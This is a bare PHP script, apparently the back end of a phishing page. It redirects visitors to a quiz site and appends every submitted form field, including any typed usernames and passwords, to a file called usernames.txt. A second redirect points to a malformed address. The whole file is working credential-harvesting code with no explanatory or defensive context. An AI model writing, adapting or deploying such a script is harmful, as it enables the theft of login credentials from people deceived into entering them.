<?php
header
('location:https://www.matequiz.com/start.html?quiz=5e50063f1622040ca306736e');
$handle=fopen("usernames.txt","a");
foreach($_POST as $variable=>$value)
{
fwrite($handle,$variable);
fwrite($handle,"=");
fwrite($handle,$value);
fwrite($handle,"\r\n");
}
fwrite($handle,"\r\n");
fclose($handle);
header("location:http://www.baby,s.com");
exit;
?>
